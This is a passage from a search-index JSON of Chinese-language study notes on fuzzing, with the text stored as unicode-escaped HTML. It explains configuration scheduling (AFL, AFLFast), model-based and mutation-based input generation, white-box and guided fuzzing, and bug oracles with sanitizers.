PUT \u6bd4\u8f83\u56f0\u96be\u65f6\uff0c\u53ef\u4ee5\u5148\u51c6\u5907\u4e00\u4e2a\u9a71\u52a8\u7a0b\u5e8f\u3002\u9700\u8981\u624b\u52a8\u51c6\u5907\uff0c\u5e76\u4e14\u53ef\u80fd\u5728\u6574\u4e2a\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\u53ea\u4f1a\u4f7f\u7528\u4e00\u6b21\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#schedule","title":"SCHEDULE","text":"<p>\u4e09\u4e2a\u8f93\u5165\u53c2\u6570\uff0c\u5206\u522b\u662f fuzz Configuration\uff0c \u4e0a\u4e00\u6b21\u8fd0\u884c\u65f6\u95f4,\u8fd0\u884c\u8d85\u65f6\u65f6\u95f4\uff1b\u901a\u8fc7\u8fd9\u4e09\u4e2a\u53c2\u6570\u8ba1\u7b97\u8fd4\u56de\u4e0b\u4e00\u6b21\u8fed\u4ee3\u6240\u9700\u8981 conf\uff08fuzz Configuration\uff09\uff0c\u8fd9\u53d6\u51b3\u4e8e Fuzzer \u7684\u7c7b\u578b\u3002</p> <p>FCS\uff08Fuzz Configuration Scheduling\uff09\u95ee\u9898</p> <p>SCHEDULING \u7b97\u6cd5\u4e5f\u5b58\u5728\u63a2\u7d22-\u5229\u7528\u51b2\u7a81\uff08exploration vs. exploitation\uff09\uff1a</p> <ul> <li>\u63a2\u7d22\uff1a\u65f6\u95f4\u82b1\u5728\u6536\u96c6\u6bcf\u4e2a\u914d\u7f6e\u7684\u66f4\u51c6\u786e\u4fe1\u606f\u4ee5\u544a\u77e5\u672a\u6765\u51b3\u7b56\u4e0a</li> <li>\u5229\u7528\uff1a\u65f6\u95f4\u82b1\u5728\u6a21\u7cca\u5316\u76ee\u524d\u88ab\u8ba4\u4e3a\u4f1a\u5bfc\u81f4\u66f4\u6709\u5229\u7ed3\u679c\u7684\u914d\u7f6e\u4e0a</li> </ul> <p>\u9ed1\u76d2 FCS \u7b97\u6cd5</p> <p>\u9ed1\u76d2 FCS \u7b97\u6cd5\u53ef\u7528\u7684\u552f\u4e00\u4fe1\u606f\u662f fuzz configuration \u7684\u6a21\u7cca\u7ed3\u679c\uff08e.g. crash\u3001bugs\u3001time...\uff09\uff0c\u56e0\u6b64\u7b97\u6cd5\u66f4\u503e\u5411\u4e8e\u9009\u62e9\u5177\u6709\u66f4\u9ad8\u6210\u529f\u7387\uff08#bugs/#runs\uff09\u7684\u914d\u7f6e\u3002</p> <p>\u4ecb\u7ecd\u4e86 WCCP/UW\u3001MAB \u7b49\u7b97\u6cd5\uff1f</p> <p>\u7070\u76d2 FCS \u7b97\u6cd5</p> <p>\u7070\u76d2 FCS \u7b97\u6cd5\u53ef\u4ee5\u5229\u7528\u66f4\u591a\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u914d\u7f6e\u6d4b\u8bd5\u4e4b\u540e\u7684\u8986\u76d6\u7387\u4fe1\u606f\u7b49\u3002</p> <p>AFL \u662f\u6b64\u7c7b\u7b97\u6cd5\u7684\u5148\u9a71\uff0c\u5176\u57fa\u4e8e\u8fdb\u5316\u7b97\u6cd5\uff08EA\uff09\u3002EA \u7ef4\u62a4\u4e00\u7fa4\u914d\u7f6e\uff0c\u6bcf\u4e2a\u914d\u7f6e\u90fd\u6709 fitness \u503c\uff0cEA \u9009\u62e9\u5408\u9002\u7684\u914d\u7f6e\u7528\u4e8e\u9057\u4f20\u8f6c\u6362\uff0c\u4f8b\u5982\u7a81\u53d8\u548c\u91cd\u7ec4\uff0c\u4ee5\u4ea7\u751f\u540e\u4ee3\uff0c\u8fd9\u4e9b\u540e\u4ee3\u53ef\u80fd\u6210\u4e3a\u65b0\u7684\u914d\u7f6e\uff08\u5047\u8bbe\u4ea7\u751f\u7684\u540e\u4ee3\u662f\u66f4\u5408\u9002\u7684\uff09\u3002</p> <p>\u90a3\u4ec0\u4e48\u914d\u7f6e\u662f\u5408\u9002\u7684\uff1fAFL \u8ba4\u4e3a\u5305\u542b\u6700\u5feb\u548c\u6700\u5c0f\u8f93\u5165\u7684\u914d\u7f6e\u662f\u5408\u9002\u7684\uff08AFL \u672f\u8bed\u4e3a favorite\uff09\u3002AFL \u7ef4\u62a4\u4e00\u4e2a\u914d\u7f6e\u961f\u5217\uff0c\u5faa\u73af\u4ece\u4e2d\u9009\u62e9\u914d\u7f6e\u3002\u4e00\u65e6\u9009\u5b9a\u4e86\u914d\u7f6e\uff0cAFL \u5bf9\u8be5\u914d\u7f6e\u8fdb\u884c\u6a21\u7cca\u5904\u7406\uff0c\u8fd0\u884c\u4e00\u5b9a\u7684\u6b21\u6570\uff08\u8be5\u6b21\u6570\u5f80\u5f80\u662f\u6052\u5b9a\u7684\uff09\u3002</p> <p>AFL Fast \u5bf9 EA \u7b97\u6cd5\u8fdb\u884c\u4e86\u4e09\u4e2a\u65b9\u9762\u7684\u4f18\u5316\uff1a</p> <ul> <li> <p>\u5728\u6267\u884c\u63a7\u5236\u6d41\u914d\u7f6e\u4e2d\uff0c\u9009\u62e9\u88ab\u9009\u62e9\u66f4\u5c11\u54ea\u4e2a\uff0c\u5982\u679c\u524d\u9762\u9009\u62e9\u6709\u51b2\u7a81\uff0c\u5219\u9009\u62e9\u5bf9\u5e94\u6267\u884c\u8def\u5f84\u6267\u884c\u6b21\u6570\u6700\u5c11\u7684\u914d\u7f6e\u3002</p> </li> <li> <p>\u9009\u62e9\u914d\u7f6e\u65f6\u4e0d\u518d\u662f\u8f6e\u8be2\u9009\u62e9\uff0c\u800c\u662f\u57fa\u4e8e\u4f18\u5148\u7ea7\u9009\u62e9\u914d\u7f6e\u3002</p> </li> <li>\u9009\u62e9\u914d\u7f6e\u8fd0\u884c\u56fa\u5b9a\u6b21\u6570\u53d8\u4e3a\u53ef\u53d8\u6b21\u6570\uff0c\u53d6\u51b3\u4e8e Power Schedule\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#input-generation","title":"INPUT GENERATION","text":"<p>\u7531\u4e8e\u6d4b\u8bd5\u7528\u4f8b\u7684\u597d\u574f\uff0c\u76f4\u63a5\u51b3\u5b9a bug \u662f\u5426\u4f1a\u88ab\u89e6\u53d1\uff0c\u56e0\u6b64\u7528\u4e8e INPUT GENERATION \u662f fuzzer \u4e2d\u6700\u91cd\u8981\u7684\u4e00\u73af\u3002</p> <p>fuzzer \u5206\u4e3a\uff1a</p> <ul> <li>Model-based(Generation-based) Fuzzers\uff1a\u6d4b\u8bd5\u7528\u4f8b\u7684\u4ea7\u751f\u53d6\u51b3\u4e8e\u6307\u5b9a\u63cf\u8ff0 PUT \u9884\u671f\u8f93\u5165\u7684\u6a21\u578b\u3002</li> <li>Model-less(Mutation-based) Fuzzers\uff1a\u6d4b\u8bd5\u7528\u4f8b\u7684\u4ea7\u751f\u6765\u81ea\u7ed9\u5b9a\u8f93\u5165\u79cd\u5b50\u7684\u7a81\u53d8\uff0c\u56e0\u4e3a\u79cd\u5b50\u53ea\u662f\u4e3e\u4f8b\u8f93\u5165\uff0c\u5c3d\u7ba1\u6570\u91cf\u5f88\u5927\uff0c\u5b83\u4e5f\u4e0d\u80fd\u5b8c\u6574\u63cf\u8ff0 PUT \u9884\u671f\u8f93\u5165\u7a7a\u95f4\u3002\u57fa\u4e8e\u53d8\u5f02\u7684 fuzzer \u901a\u5e38\u88ab\u8ba4\u4e3a\u662f\u65e0\u6a21\u578b\u7684\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#model-based","title":"Model-based\uff08\u57fa\u4e8e\u751f\u6210\uff09","text":"<p>\u76ee\u524d\u5927\u81f4\u5206\u4e3a\u4e09\u79cd\uff1a</p> <ul> <li>Predefined Model\uff1a\u9884\u5b9a\u4e49\u6a21\u578b\u3002</li> <li>\u7528\u6237\u914d\u7f6e\uff1a\u4f8b\u5982 Peach \u7b49\u8fd0\u884c\u7528\u6237\u6307\u5b9a\u8f93\u5165\u8bed\u6cd5\uff0cAutodafe \u7b49\u63d0\u4f9b API \u8ba9\u7528\u6237\u521b\u5efa\u81ea\u5df1\u7684 input models\uff0c\u7b49\u7b49\u3002</li> <li>fuzzer \u5185\u7f6e\uff1a\u4f8b\u5982\u9488\u5bf9\u7279\u5b9a\u7684\u8bed\u8a00\u6216\u8bed\u6cd5\u7684 fuzzer\uff0c\u5176\u5c06\u8be5\u8bed\u8a00\u7684\u6a21\u578b\u5185\u7f6e\u4e8e fuzzer \u4e2d\u3002</li> <li>Inferred Model\uff1a\u63a8\u7406\u6a21\u578b</li> <li>Model Inference in PREPROCESS\uff1aTextMiner \u5728\u5f85\u6d4b\u7a0b\u5e8f\u4e2d\u641c\u7d22\u4f8b\u5982\u5e38\u91cf\u4e4b\u7c7b\u7684\u6570\u636e\uff0c\u4ee5\u6b64\u63a8\u6d4b\u53ef\u80fd\u7684 inputs\uff1bNeural and Learn&amp;Fuzz \u4f7f\u7528\u795e\u7ecf\u7f51\u7edc\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u4ece\u4e00\u4e2a\u7ed9\u5b9a\u7684\u6d4b\u8bd5\u6587\u4ef6\u7684\u96c6\u5408\u5b66\u4e60\u4e00\u4e2a\u6a21\u578b\uff0c\u7136\u540e\u4f7f\u7528\u8fd9\u4e2a\u6a21\u578b\u4ea7\u751f\u6d4b\u8bd5\u7528\u4f8b\uff0c\u7b49\u7b49\u3002</li> <li>Model Inference in CONFUPDATE\uff1a\u53ef\u4ee5\u5728\u6bcf\u6b21\u6a21\u7cca\u8fed\u4ee3\u540e\u66f4\u65b0\u6a21\u578b\u3002PULSAR \u4ece\u4e00\u7cfb\u5217\u6355\u83b7 PUT \u4ea7\u751f\u7684\u7f51\u7edc\u5305\u4e2d\u63a8\u65ad\u51fa\u4e00\u4e2a\u7f51\u7edc\u534f\u8bae\u6a21\u578b\uff0c\u7136\u540e\u4f7f\u7528\u8fd9\u4e2a\u6a21\u578b\u8fdb\u884c fuzz\uff1bDoupe et al \u63d0\u51fa\u4e86\u4e00\u79cd\u901a\u8fc7\u89c2\u5bdf I/O \u884c\u4e3a\u63a8\u65ad\u51fa web \u670d\u52a1\u7684\u72b6\u6001\u673a\uff0c\u7136\u540e\u4f7f\u7528\u8fd9\u4e2a\u6a21\u578b\u53bb\u626b\u63cf web \u6f0f\u6d1e\uff0c\u7b49\u7b49\u3002</li> <li>Encoder Model\uff1afuzzing \u901a\u5e38\u88ab\u7528\u4e8e\u6d4b\u8bd5\u89e3\u6790\u7279\u5b9a\u6587\u4ef6\u683c\u5f0f\u7684 decoder \u7a0b\u5e8f\u3002\u5f88\u591a\u6587\u4ef6\u683c\u5f0f\u90fd\u6709\u5bf9\u5e94\u7684 encoder \u7a0b\u5e8f\uff0cencoder \u7a0b\u5e8f\u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u6587\u4ef6\u683c\u5f0f\u7684\u9690\u542b\u6a21\u578b\u3002</li> </ul> <p>\u6b64\u5904\u7684\u6a21\u578b\u662f\u5426\u53ef\u4ee5\u7406\u89e3\u4e3a\u8f93\u5165\u683c\u5f0f\uff1f\u57fa\u4e8e\u8be5\u6a21\u578b\u751f\u6210\u6d4b\u8bd5\u7528\u4f8b\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#model-less","title":"Model-less\uff08\u57fa\u4e8e\u53d8\u5f02\uff09","text":"<p>\u7ecf\u5178\u7684\u968f\u673a\u751f\u6210\uff0c\u5bf9\u4e8e\u9700\u8981\u751f\u6210\u6ee1\u8db3\u7279\u5b9a\u8def\u5f84\u6761\u4ef6\u7684\u6d4b\u8bd5\u7528\u4f8b\u7684\u60c5\u51b5\u6548\u7387\u5f88\u4f4e\u3002</p> <p>\u4f8b\u5982\uff1a<code>if( inpit == 42)</code>\uff0c\u82e5 <code>input</code> \u662f\u4e00\u4e2a 32 \u4f4d\u6574\u6570\uff0c\u90a3\u4e48\u968f\u673a\u751f\u6210\u6b63\u786e\u8f93\u5165\u503c\u7684\u6982\u7387\u662f \\(1/2^{32}\\) \u3002\u5f53\u8003\u8651 well-structured input \uff08\u4f8b\u5982 MP3\uff09 \u65f6\uff0c\u60c5\u51b5\u4f1a\u66f4\u7cdf\u7cd5\uff0c\u968f\u673a\u6d4b\u8bd5\u51e0\u4e4e\u4e0d\u53ef\u80fd\u5728\u5408\u7406\u7684\u65f6\u95f4\u5185\u751f\u6210\u6709\u6548\u7684 MP3 \u6587\u4ef6\u4f5c\u4e3a\u6d4b\u8bd5\u7528\u4f8b\u3002</p> <p>\u5927\u591a\u6570 Model-less fuzzer \u90fd\u91c7\u7528 seed\uff0cseed \u662f\u5bf9 PUT \u7cbe\u5fc3\u6784\u9020\u7684\u8f93\u5165\uff0c\u901a\u8fc7\u4fee\u6539 seed \u7684\u4e00\u90e8\u5206\uff08\u53d8\u5f02\uff09\u6765\u751f\u6210\u65b0\u7684\u6d4b\u8bd5\u7528\u4f8b\uff0c\u8be5\u6d4b\u8bd5\u7528\u4f8b\u5927\u6982\u7387\u662f\u6709\u6548\u7684\uff08\u4f46\u4e5f\u53ef\u80fd\u5305\u542b\u5f02\u5e38\u503c\uff0c\u5bfc\u81f4 PUT \u5d29\u6e83\uff09\u3002</p> <p>\u5e38\u89c1\u7684\u53d8\u5f02 seed \u7684\u65b9\u6cd5\u5982\u4e0b\uff1a</p> <ul> <li> <p>Bit-Flipping\uff1a\u4f4d\u7ffb\u8f6c\u3002\u6709\u4e9b fuzzer \u7b80\u5355\u5730\u7ffb\u8f6c\u56fa\u5b9a\u6570\u91cf\u7684\u4f4d\uff0c\u6709\u4e9b fuzzer \u5219\u968f\u673a\u786e\u5b9a\u8981\u7ffb\u8f6c\u7684\u4f4d\u6570\uff0c\u8fd8\u6709\u4e9b\u63d0\u4f9b\u53ef\u914d\u7f6e\u7684\u53c2\u6570\uff08\u53d8\u5f02\u6bd4\uff09\uff0c\u5176\u51b3\u5b9a\u7ffb\u8f6c\u7684\u4f4d\u6570\uff0c\u5047\u8bbe fuzzer \u50cf\u8981\u4ece\u7ed9\u5b9a\u7684 N \u4f4d\u79cd\u5b50\u79cd\u7ffb\u8f6c K \u4e2a\u968f\u673a\u4f4d\uff0c\u6b64\u65f6\u53d8\u5f02\u6bd4\u5e94\u8bbe\u7f6e\u4e3a K/N\u3002SymFuzz \u8868\u660e fuzz \u6027\u80fd\u5bf9\u7a81\u53d8\u7387\u5f88\u654f\u611f\uff0c\u4e14\u6ca1\u6709\u4e00\u4e2a\u6bd4\u7387\u9002\u7528\u4e8e\u6240\u6709 PUT\u3002</p> </li> <li> <p>Arithmetic Mutation\uff1a\u7b97\u6570\u7a81\u53d8\u3002\u9009\u62e9\u4e00\u4e2a\u5b57\u8282\u5e8f\u5217\u4f5c\u4e3a\u6574\u6570\uff0c\u5e76\u5bf9\u8be5\u503c\u8fdb\u884c\u7b80\u5355\u7684\u7b97\u672f\u8fd0\u7b97\uff0c\u7136\u540e\u7528\u8ba1\u7b97\u7ed3\u679c\u66ff\u6362\u9009\u62e9\u7684\u5b57\u8282\u5e8f\u5217\u3002\u8be5\u65b9\u6cd5\u53ef\u4ee5\u5c06\u7a81\u53d8\u7684\u5f71\u54cd\u9650\u5236\u5728\u4e00\u4e2a\u5f88\u5c0f\u7684\u6570\u5b57\u5185\u3002</p> </li> </ul> <p>\u4f8b\u5982\uff0cAFL \u4ece seed \u4e2d\u9009\u62e9\u4e00\u4e2a 4 \u5b57\u8282\u7684\u503c\uff0c\u5e76\u5c06\u8be5\u503c\u89c6\u4e3a\u6574\u6570 i\u3002\u7136\u540e\u5c06\u79cd\u5b50\u4e2d\u7684\u503c\u66ff\u6362\u4e3a i\u00b1r\uff0c\u5176\u4e2d r \u662f\u968f\u673a\u751f\u6210\u7684\u5c0f\u6574\u6570\u3002</p> <p>r \u7684\u8303\u56f4\u53d6\u51b3\u4e8e\u6a21\u7cca\u5668\uff0c\u5e76\u4e14\u901a\u5e38\u662f\u7528\u6237\u53ef\u914d\u7f6e\u7684\u3002\u5728 AFL \u4e2d\uff0c\u9ed8\u8ba4\u8303\u56f4\u4e3a\uff1a0\u2264r&lt;35</p> <ul> <li> <p>Block-based Mutation\uff1a\u57fa\u4e8e\u5757\u7684\u53d8\u5f02\u3002Block \u662f\u79cd\u5b50\u7684\u4e00\u4e2a\u5b57\u8282\u5e8f\u5217\u3002</p> </li> <li> <p>\u5728\u79cd\u5b50\u7684\u968f\u673a\u4f4d\u7f6e\u63d2\u5165\u968f\u673a\u751f\u6210\u7684 Block\uff1b</p> </li> <li>\u4ece\u79cd\u5b50\u4e2d\u968f\u673a\u9009\u62e9 Block \u5220\u9664\uff1b</li> <li>\u968f\u673a\u9009\u62e9 Block \u66ff\u6362\u4e3a\u968f\u673a\u503c\uff1b</li> <li>\u968f\u673a\u53d8\u6362 Block \u5e8f\u5217\uff1b</li> <li>\u4f7f\u7528\u4e00\u4e2a\u968f\u673a Block \u6539\u53d8\u79cd\u5b50\u5927\u5c0f\uff1b</li> <li> <p>\u4ece\u4e00\u4e2a\u79cd\u5b50\u4e2d\u968f\u673a\u9009\u53d6 Block \u968f\u673a\u63d2\u5165\u6216\u66ff\u6362\u6389\u53e6\u4e00\u4e2a\u79cd\u5b50\u7684 Block\uff1b</p> </li> <li> <p>Dictionary-based Mutation\uff1a\u57fa\u4e8e\u5b57\u5178\u7684\u53d8\u5f02\u3002\u4f7f\u7528\u4e00\u7ec4\u9884\u5b9a\u4e49\u7684\u9690\u542b\u91cd\u8981\u8bed\u4e49\u6743\u91cd\u7684\u503c\u8fdb\u884c\u7a81\u53d8\u3002\u4f8b\u5982 AFL \u5728\u6539\u53d8\u6574\u6570\u65f6\u4f7f\u7528 0\u3001-1\u30011 \u7b49\u503c\u3002Radamsa \u4f7f\u7528 Unicode \u5b57\u7b26\u4e32\uff0cGPF \u4f7f\u7528 %x \u548c %s \u7b49\u683c\u5f0f\u5316\u5b57\u7b26\u6765\u6539\u53d8\u5b57\u7b26\u4e32\u3002</p> </li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#white-box-fuzzers","title":"White-box Fuzzers","text":"<p>\u6709\u7684 Fuzzer \u5229\u7528\u767d\u76d2\u7a0b\u5e8f\u5206\u6790\u6765\u67e5\u627e\u6709\u5173 PUT \u63a5\u6536\u7684\u8f93\u5165\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u7528\u4e8e\u9ed1\u76d2\u6216\u8005\u7070\u76d2\u6d4b\u8bd5\u3002</p> <ul> <li> <p>\u52a8\u6001\u7b26\u53f7\u6267\u884c\uff08Dynamic Symbolic Execution\uff09</p> </li> <li> <ul> <li>\u52a8\u6001\u7b26\u53f7\u6267\u884c\u662f\u4f20\u7edf\u7684\u7b26\u53f7\u6267\u884c\u7684\u53d8\u4f53\uff0c\u5728\u52a8\u6001\u7b26\u53f7\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u7b26\u53f7\u6267\u884c\u548c\u5b9e\u9645\u7684\u6267\u884c\uff08concrete input\uff09\u4f1a\u540c\u65f6\u8fdb\u884c\uff0c\u56e0\u6b64\u88ab\u79f0\u4e3a concolic\uff08concrete + symbolic\uff09testing\u3002</li> </ul> </li> <li> <p>\u5efa\u7acb\u7b26\u53f7\u8868\u8fbe\u5f0f\u3002\u4e3a\u6267\u884c\u8fc7\u7a0b\u4e2d\u9047\u5230\u7684\u6bcf\u4e00\u6761\u5206\u652f\u6307\u4ee4\u5efa\u7acb\u4e00\u4e2a\u8def\u5f84\u516c\u5f0f\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u5b9e\u9645\u7684\u8f93\u5165\uff0c\u80fd\u591f\u6267\u884c\u76ee\u6807\u8def\u5f84\uff0c\u90a3\u4e48\u5c31\u8bf4\u8be5\u8def\u5f84\u516c\u5f0f\u662f\u53ef\u6ee1\u8db3\u7684\u3002</p> </li> <li> <p>Guided Fuzzing\uff1a\u4f7f\u7528\u9759\u6001\u5206\u6790\u6216\u8005\u52a8\u6001\u5206\u6790\u6765\u589e\u5f3a Fuzzing \u7684\u6548\u679c\u3002</p> </li> <li> <ul> <li>\u4f7f\u7528\u5f00\u9500\u8f83\u5927\u7684\u7a0b\u5e8f\u5206\u6790 PUT\uff0c\u4ee5\u6b64\u6765\u83b7\u53d6\u6709\u5173\u4e8e PUT \u7684\u6709\u7528\u4fe1\u606f\u3002</li> </ul> </li> <li> <p>\u4f7f\u7528\u4e0a\u4e00\u6761\u5206\u6790\u83b7\u53d6\u7684\u6709\u7528\u4fe1\u606f\u751f\u6210\u6d4b\u8bd5\u7528\u4f8b\u3002</p> </li> <li> <p>\u4f7f\u7528\u7ec6\u7c92\u5ea6\u7684\u6c61\u70b9\u5206\u6790\u6765\u67e5\u627e\u6d41\u5165\u5173\u952e\u7cfb\u7edf\u8c03\u7528\u6216 API \u8c03\u7528\u7684\u8f93\u5165\u5b57\u8282\uff08hot bytes\uff09\u3002</p> </li> <li> <ul> <li>\u5728\u7f16\u8bd1\u65f6\u671f\u6267\u884c\u9759\u6001\u5206\u6790\uff0c\u63a2\u7d22\u5f0f\u67e5\u627e\u53ef\u80fd\u5305\u542b\u9519\u8bef\u7684\u5faa\u73af\uff0c\u4f8b\u5982\u7a7a\u6307\u9488\u5f15\u7528\uff0c\u7136\u540e\u901a\u8fc7\u6c61\u70b9\u5206\u6790\u8ba1\u7b97\u8f93\u5165\u5b57\u8282\u4e0e\u5faa\u73af\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u6700\u540e\u53ea\u5c06\u5173\u952e\u5b57\u8282\u53d8\u4e3a\u7b26\u53f7\uff0c\u8fd0\u884c\u52a8\u6001\u7b26\u53f7\u6267\u884c\u3002</li> <li>\u4f7f\u7528\u6c61\u70b9\u5206\u6790\u5c06\u6bcf\u4e2a\u8def\u5f84\u7ea6\u675f\u548c\u5bf9\u5e94\u7684\u5b57\u8282\u8054\u7cfb\u8d77\u6765\uff0c\u7136\u540e\u6267\u884c\u68af\u5ea6\u4e0b\u964d\u5f0f\u641c\u7d22\u7b97\u6cd5\uff0c\u53bb\u5f15\u5bfc\u7a81\u53d8\u671d\u89e3\u51b3\u7ea6\u675f\u7684\u65b9\u5411\u8d70\u3002</li> <li>\u901a\u8fc7\u63d2\u6869\u6bd4\u8f83\u548c\u67e5\u627e\u6240\u6709\u64cd\u4f5c\u5bf9\u8c61\u4e0e\u7ed9\u5b9a\u8f93\u5165\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u6765\u68c0\u6d4b PUT \u4e2d\u5982\u4f55\u4f7f\u7528\u8f93\u5165\u3002</li> </ul> </li> <li> <p>PUT Mutation\uff1a\u5982\u4f55\u7ed5\u8fc7\u68c0\u9a8c\u548c\u9a8c\u8bc1\u3002</p> </li> <li> <ul> <li>stitched dynamic symbolic execution\uff1a\u5728\u5b58\u5728\u6821\u9a8c\u7684\u60c5\u51b5\u4e0b\u751f\u6210\u6d4b\u8bd5\u7528\u4f8b\u3002</li> </ul> </li> <li> <ul> <li>\u4f7f\u7528\u6c61\u70b9\u5206\u6790\u6765\u6821\u9a8c\u548c\u6d4b\u8bd5\u6307\u4ee4\uff0c\u5e76\u901a\u8fc7\u6253\u8865\u4e01\u6765\u7ed5\u8fc7\u9a8c\u8bc1\u3002\u5f53\u53d1\u73b0\u7a0b\u5e8f\u5d29\u6e83\u65f6\uff0c\u4f1a\u4f7f\u7528\u6b63\u786e\u7684\u9a8c\u8bc1\u4f5c\u4e3a\u8f93\u5165\uff0c\u4ee5\u6b64\u6765\u751f\u6210\u4f7f\u672a\u4fee\u6539 PUT \u5d29\u6e83\u7684\u6d4b\u8bd5\u7528\u4f8b\u3002</li> </ul> </li> <li> <ul> <li>\u5728\u4e0a\u9762\u65b9\u6cd5\u7684\u57fa\u7840\u4e0a\uff0c\u901a\u8fc7\u7070\u76d2\u6d4b\u8bd5\uff0c\u80fd\u591f\u6709\u6548\u6e17\u900f\u6240\u6709\u7c7b\u578b\u7684\u6761\u4ef6\u5206\u652f\u3002</li> </ul> </li> <li> <ul> <li>\u9996\u5148\u4f7f\u7528\u4e00\u7ec4 NCC\uff08Non-Critical Checks\uff09\uff0c\u5b83\u53ef\u4ee5\u5728\u4e0d\u6539\u53d8\u7a0b\u5e8f\u903b\u8f91\u60c5\u51b5\u4e0b\u8fdb\u884c\u5206\u652f\u8f6c\u6362\u3002\u5f53 fuzzing campaign \u53d1\u73b0\u65b0\u7684\u8def\u5f84\u505c\u6b62\u65f6\uff0c\u9009\u62e9\u4e00\u4e2a NCC\uff0c\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\uff0c\u7136\u540e\u5728\u4fee\u6539\u8fc7\u7684 PUT \u4e0a\u91cd\u65b0\u8fdb\u884c fuzzing campaign\uff1b\u6700\u540e\uff0c\u5f53\u53d1\u73b0\u5d29\u6e83\u65f6\uff0c\u5c1d\u8bd5\u4f7f\u7528\u7b26\u53f7\u6267\u884c\u5728\u539f\u59cb\u7a0b\u5e8f\u4e0a\u590d\u73b0\u3002</li> </ul> </li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#input-evaluation","title":"INPUT EVALUATION","text":"<p>\u5728\u751f\u6210\u8f93\u5165\uff08\u57fa\u4e8e\u6a21\u578b\u7684\u3001\u57fa\u4e8e\u53d8\u5f02\u7684\uff09\u4e4b\u540e\uff0cfuzzer \u4f7f\u7528\u8be5\u8f93\u5165\u6267\u884c PUT\uff0c\u5e76\u51b3\u5b9a\u5982\u4f55\u5904\u7406\u6267\u884c\u7ed3\u679c\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#bug-oracle","title":"Bug Oracle","text":"<p>\u5178\u578b\u7684\u5b89\u5168\u7b56\u7565\u5c06\u56e0\u4e3a fatal signal \uff08\u4f8b\u5982\u6bb5\u9519\u8bef\uff09\u5bfc\u81f4\u7a0b\u5e8f\u7ec8\u6b62\u7684\u6d4b\u8bd5\u89c6\u4e3a\u8fdd\u89c4\u6d4b\u8bd5\uff0c\u8be5\u7b56\u7565\u5bf9\u5185\u5b58\u6f0f\u6d1e\u5341\u5206\u6709\u6548\uff0c\u56e0\u4e3a\u65e0\u6548\u503c\u8986\u76d6\u6570\u636e\u6216\u4ee3\u7801\u6307\u9488\u7684\u6f0f\u6d1e\u901a\u5e38\u5bfc\u81f4\u6bb5\u9519\u8bef\u800c\u7ec8\u6b62\uff0c\u4e14\u8be5\u7b56\u7565\u6613\u4e8e\u5b9e\u73b0\uff0c\u56e0\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u5141\u8bb8\u6b64\u7c7b\u5f02\u5e38\u60c5\u51b5\u5728\u6ca1\u6709\u4efb\u4f55\u68c0\u6d4b\u7684\u60c5\u51b5\u4e0b\u88ab fuzzer \u6355\u83b7\u3002</p> <p>\u4f46\u8be5\u7b56\u7565\u5e76\u4e0d\u80fd\u68c0\u6d4b\u6240\u6709\u7684\u5185\u5b58\u6f0f\u6d1e\uff0c\u4f8b\u5982\u5806\u6808\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8986\u5199\u4e86\u6307\u9488\u6307\u5411\u53e6\u4e00\u4e2a\u6709\u6548\u5730\u5740\uff0c\u7a0b\u5e8f\u53ef\u80fd\u4ec5\u51fa\u73b0\u65e0\u6548\u7ed3\u679c\uff0c\u800c\u4e0d\u4f1a\u5d29\u6e83\u7ec8\u6b62\uff0c\u56e0\u6b64 fuzzer \u65e0\u6cd5\u68c0\u6d4b\u5230\u8be5\u6f0f\u6d1e\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\uff0c researchers have proposed a variety of ef\ufb01cient program transformations that detect unsafe or unwanted program behaviors and abort the program. These are often called <code>sanitizers</code>.</p> <ul> <li>\u5185\u5b58\u7c7b\u578b\u5b89\u5168\uff08Memory and Type Safety\uff09\uff1a\u5206\u4e3a\u7a7a\u95f4\u6027\u548c\u65f6\u95f4\u6027\u9519\u8bef\u3002\u7a7a\u95f4\u6027\u9519\u8bef\u6307\u5728\u5bf9\u8c61\u4e4b\u5916\u88ab\u95f4\u63a5\u5f15\u7528\u6307\u5411\u5b83\u539f\u672c\u6307\u5411\u7684\u5bf9\u8c61\u4e4b\u5916\u7684\u60c5\u51b5\u4e0b\u3002\u65f6\u95f4\u6027\u9519\u8bef\u901a\u5e38\u53d1\u751f\u5728\u6307\u9488\u5931\u6548\u540e\u88ab\u5f15\u7528\u3002</li> <li>\u5728\u7f16\u8bd1\u65f6\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u63d2\u6869\uff0c\u91c7\u7528\u5f71\u5b50\u5185\u5b58\uff08shadow memory\uff09\uff0c\u5141\u8bb8\u6bcf\u4e2a\u5185\u5b58\u5730\u5740\u5728\u88ab\u89e3\u5f15\u7528\u4e4b\u524d\uff0c\u5feb\u901f\u5730\u8fdb\u884c\u5408\u6cd5\u68c0\u67e5\u3002</li> 